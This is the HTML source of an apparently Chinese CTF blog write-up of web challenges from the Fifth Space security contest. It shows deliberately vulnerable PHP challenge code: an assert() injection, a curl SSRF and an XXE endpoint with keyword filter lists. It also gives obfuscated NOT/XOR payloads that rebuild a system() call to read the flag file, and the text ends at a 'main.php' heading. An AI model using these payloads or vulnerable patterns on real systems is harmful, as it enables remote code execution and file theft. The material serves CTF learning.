@@ -1,0 +1,990 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.0">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.0" color="#222">
+  <link rel="alternate" href="/atom.xml" title="0xCreed" type="application/atom+xml">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+  <meta name="google-site-verification" content="rVyfNQnulCtgdXjqVYGrMUrs740-YJfu_KMgtp6etq0">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-loading-bar.min.css?v=1.0.2">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '7.4.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":true,"style":"default"},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="摸鱼">
+<meta name="keywords" content="WEB,WP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第四届届第五空间安全大赛">
+<meta property="og:url" content="https://0xcreed.jxustctf.top/2020/06/第四届届第五空间安全大赛/index.html">
+<meta property="og:site_name" content="0xCreed">
+<meta property="og:description" content="摸鱼">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/06/第四届届第五空间安全大赛/image-20200626110638762.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/06/第四届届第五空间安全大赛/image-20200626120356953.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/06/第四届届第五空间安全大赛/image-20200626120455719.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/06/第四届届第五空间安全大赛/image-20200626132854601.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/06/第四届届第五空间安全大赛/image-20200626133727220.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/06/第四届届第五空间安全大赛/image-20200626133825721.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/06/第四届届第五空间安全大赛/image-20200626133930336.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/06/第四届届第五空间安全大赛/image-20200627101937077.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/06/第四届届第五空间安全大赛/image-20200627102635262.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/06/第四届届第五空间安全大赛/image-20200627102842991.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/06/第四届届第五空间安全大赛/image-20200627104512801.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/06/第四届届第五空间安全大赛/image-20200627104803417.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/06/第四届届第五空间安全大赛/image-20200627105703977.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/06/第四届届第五空间安全大赛/image-20200627105855419.png">
+<meta property="og:updated_time" content="2020-06-27T10:52:12.447Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="第四届届第五空间安全大赛">
+<meta name="twitter:description" content="摸鱼">
+<meta name="twitter:image" content="https://0xcreed.jxustctf.top/2020/06/第四届届第五空间安全大赛/image-20200626110638762.png">
+  <link rel="canonical" href="https://0xcreed.jxustctf.top/2020/06/第四届届第五空间安全大赛/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>第四届届第五空间安全大赛 | 0xCreed</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <div class="container use-motion">
+    <div class="headband"></div>
+	<a href="https://github.com/0xcreed" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">0xCreed</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+      
+      
+        
+      
+        
+      
+        
+      
+    
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-about">
+      
+    
+      
+      
+        
+      
+        
+      
+        
+      
+    
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-tags">
+      
+    
+      
+      
+        
+      
+        
+      
+        
+          
+        
+      
+    
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签<span class="badge">27</span></a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-categories">
+      
+    
+      
+      
+        
+      
+        
+          
+        
+      
+        
+      
+    
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类<span class="badge">4</span></a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+      
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档<span class="badge">22</span></a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-commonweal">
+      
+    
+      
+      
+        
+      
+        
+      
+        
+      
+    
+
+    <a href="/404/" rel="section"><i class="fa fa-fw fa-heartbeat"></i>公益 404</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a href="javascript:;" class="popup-trigger">
+        
+          <i class="fa fa-search fa-fw"></i>搜索</a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="搜索..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+      <article itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block post">
+    <link itemprop="mainEntityOfPage" href="https://0xcreed.jxustctf.top/2020/06/第四届届第五空间安全大赛/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="0xCreed">
+      <meta itemprop="description" content="Winter is coming">
+      <meta itemprop="image" content="/images/1.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="0xCreed">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">第四届届第五空间安全大赛
+
+          
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              
+                
+              
+
+              <time title="创建时间：2020-06-24 10:23:56" itemprop="dateCreated datePublished" datetime="2020-06-24T10:23:56+08:00">2020-06-24</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-06-27 18:52:12" itemprop="dateModified" datetime="2020-06-27T18:52:12+08:00">2020-06-27</time>
+              </span>
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+        
+      
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2020/06/第四届届第五空间安全大赛/#comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2020/06/第四届届第五空间安全大赛/" itemprop="commentCount"></span></a>
+  </span>
+  
+  
+          
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span>10k</span>
+            </span>
+          
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span>9 分钟</span>
+            </span>
+          
+            <div class="post-description">摸鱼</div>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="1-hate-php"><a href="#1-hate-php" class="headerlink" title="1.hate-php"></a>1.<strong>hate-php</strong></h3><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/(f|l|a|g|\.|p|h|\/|;|\"|\'|\`|\||\[|\]|\_|=)/i'</span>,$code)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'You are too good for me'</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = get_defined_functions()[<span class="string">'internal'</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123; </span><br><span class="line">        <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blackitem . <span class="string">'/im'</span>, $code)) &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'You deserve better'</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    assert($code);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a>
+
+
+<p>禁用了 <code>=</code> 所以伪协议 拼接字符串 等方法用不了</p>
+<p>但 取反和异或没被禁用</p>
+<p>取反payload:</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=(~<span class="symbol">%8</span>C<span class="symbol">%86</span><span class="symbol">%8</span>C<span class="symbol">%8</span>B<span class="symbol">%9</span>A<span class="symbol">%92</span>)(~<span class="symbol">%9</span>C<span class="symbol">%9</span>E<span class="symbol">%8</span>B<span class="symbol">%DF</span><span class="symbol">%99</span><span class="symbol">%93</span><span class="symbol">%9</span>E<span class="symbol">%98</span><span class="symbol">%D1</span><span class="symbol">%8</span>F<span class="symbol">%97</span><span class="symbol">%8</span>F)</span><br></pre></td></tr></table></figure>
+
+<p> 异或payload</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=(<span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span>^<span class="symbol">%D3</span><span class="symbol">%D9</span><span class="symbol">%D3</span><span class="symbol">%D4</span><span class="symbol">%C5</span><span class="symbol">%CD</span>)(<span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span>^<span class="symbol">%C3</span><span class="symbol">%C1</span><span class="symbol">%D4</span><span class="symbol">%80</span><span class="symbol">%C6</span><span class="symbol">%CC</span><span class="symbol">%C1</span><span class="symbol">%C7</span><span class="symbol">%8</span>E<span class="symbol">%D0</span><span class="symbol">%C8</span><span class="symbol">%D0</span>)</span><br></pre></td></tr></table></figure>
+
+<p><a href="http://0xcreed.jxustctf.top/2019/10/%E7%AC%AC%E5%8D%81%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98Write-up/#RCE-me-I-don%E2%80%99t-think-U-can-system-RCE-prove-to-me">异或构造脚本</a></p>
+<h3 id="2-do-you-know"><a href="#2-do-you-know" class="headerlink" title="2.do you know"></a>2.do you know</h3><p>index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">#本题无法访问外网</span></span><br><span class="line"><span class="comment">#这题真没有其他文件，请不要再开目录扫描器了，有的文件我都在注释里面告诉你们了</span></span><br><span class="line"><span class="comment">#各位大佬...这题都没有数据库的存在...麻烦不要用工具扫我了好不好</span></span><br><span class="line"><span class="comment">#there is xxe.php</span></span><br><span class="line">$poc=$_SERVER[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/log|flag|hist|dict|etc|file|write/i"</span> ,$poc))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"no hacker"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">$ids=explode(<span class="string">'&amp;'</span>,$poc);</span><br><span class="line">$a_key=explode(<span class="string">'='</span>,$ids[<span class="number">0</span>])[<span class="number">0</span>];</span><br><span class="line">$b_key=explode(<span class="string">'='</span>,$ids[<span class="number">1</span>])[<span class="number">0</span>];</span><br><span class="line">$a_value=explode(<span class="string">'='</span>,$ids[<span class="number">0</span>])[<span class="number">1</span>];</span><br><span class="line">$b_value=explode(<span class="string">'='</span>,$ids[<span class="number">1</span>])[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$a_key||!$b_key||!$a_value||!$b_value)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'我什么都没有~'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($a_key==$b_key)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"trick"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($a_value!==$b_value)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">if</span>(count($_GET)!=<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'be it so'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key=&gt;$value)</span><br><span class="line">&#123;</span><br><span class="line">        $url=$value;</span><br><span class="line">&#125;</span><br><span class="line">$ch = curl_init();</span><br><span class="line">    <span class="keyword">if</span> ($type != <span class="string">'file'</span>) &#123;</span><br><span class="line">        <span class="comment">#add_debug_log($param, 'post_data');</span></span><br><span class="line">        <span class="comment">// 设置超时</span></span><br><span class="line">        curl_setopt($ch, CURLOPT_TIMEOUT, <span class="number">30</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 设置超时</span></span><br><span class="line">        curl_setopt($ch, CURLOPT_TIMEOUT, <span class="number">180</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_POST, <span class="keyword">true</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="keyword">false</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置header</span></span><br><span class="line">    <span class="keyword">if</span> ($type == <span class="string">'file'</span>) &#123;</span><br><span class="line">        $header[] = <span class="string">"content-type: multipart/form-data; charset=UTF-8"</span>;</span><br><span class="line">        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> ($type == <span class="string">'xml'</span>) &#123;</span><br><span class="line">        curl_setopt($ch, CURLOPT_HEADER, <span class="keyword">false</span>);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> ($has_json) &#123;</span><br><span class="line">        $header[] = <span class="string">"content-type: application/json; charset=UTF-8"</span>;</span><br><span class="line">        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)');</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_AUTOREFERER, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// dump($param);</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_POSTFIELDS, $param);</span><br><span class="line">    <span class="comment">// 要求结果为字符串且输出到屏幕上</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="keyword">true</span>);</span><br><span class="line">    <span class="comment">// 使用证书：cert 与 key 分别属于两个.pem文件</span></span><br><span class="line">    $res = curl_exec($ch);</span><br><span class="line">    var_dump($res);</span><br></pre></td></tr></table></figure>
+
+<p>xxe.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">#这题在上午的时候为了防止有人用webshell扫描器d，有一段时间临时过滤了system关键字，但是这个关键字在解题中是用不到的，所以才过滤它，给选手造成的不便请您谅解</span></span><br><span class="line"><span class="comment">#这题和命令执行无关，请勿尝试</span></span><br><span class="line"><span class="comment">#there is main.php and hints.php</span></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>] !== <span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'show me your identify'</span>);</span><br><span class="line">&#125;</span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">$data = <span class="keyword">isset</span>($_POST[<span class="string">'data'</span>])?trim($_POST[<span class="string">'data'</span>]):<span class="string">''</span>;</span><br><span class="line">$data = preg_replace(<span class="string">"/file|flag|write|xxe|test|rot13|utf|print|quoted|read|string|ASCII|ISO|CP1256|cs_CZ|en_AU|dtd|mcrypt|zlib/i"</span>,<span class="string">''</span>,$data);</span><br><span class="line">$resp = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>($data != <span class="keyword">false</span>)&#123;</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($data, LIBXML_NOENT);</span><br><span class="line">    ob_start();</span><br><span class="line">    var_dump($dom);</span><br><span class="line">    $resp = ob_get_contents();</span><br><span class="line">    ob_end_clean();  </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;style&gt;</span><br><span class="line">div.main&#123;</span><br><span class="line">    width:<span class="number">90</span>%;</span><br><span class="line">    max-width:<span class="number">50</span>em;</span><br><span class="line">    margin:<span class="number">0</span> auto;</span><br><span class="line">&#125;</span><br><span class="line">textarea&#123;</span><br><span class="line">    width:<span class="number">100</span>%;</span><br><span class="line">    height:<span class="number">10</span>em;</span><br><span class="line">&#125;</span><br><span class="line">input[type=<span class="string">"submit"</span>]&#123;</span><br><span class="line">    margin: <span class="number">1</span>em <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;div class="main"&gt;</span><br><span class="line">    &lt;form action=<span class="string">""</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">        &lt;textarea name=<span class="string">"data"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> ($data!=<span class="keyword">false</span>)?htmlspecialchars($data):htmlspecialchars(<span class="string">''</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">        &lt;/textarea&gt;&lt;br/&gt;</span><br><span class="line">        &lt;input style=<span class="string">""</span> type=<span class="string">"submit"</span> value=<span class="string">"submit"</span>/&gt;</span><br><span class="line">        &amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;a target=<span class="string">"_blank"</span> href=<span class="string">"&lt;?php echo basename(__FILE__).'?s';?&gt;"</span>&gt;View Source Code&lt;/a&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;pre&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> htmlspecialchars($resp);<span class="meta">?&gt;</span></span><br><span class="line">    &lt;/pre&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
+
+<p>main.php</p>
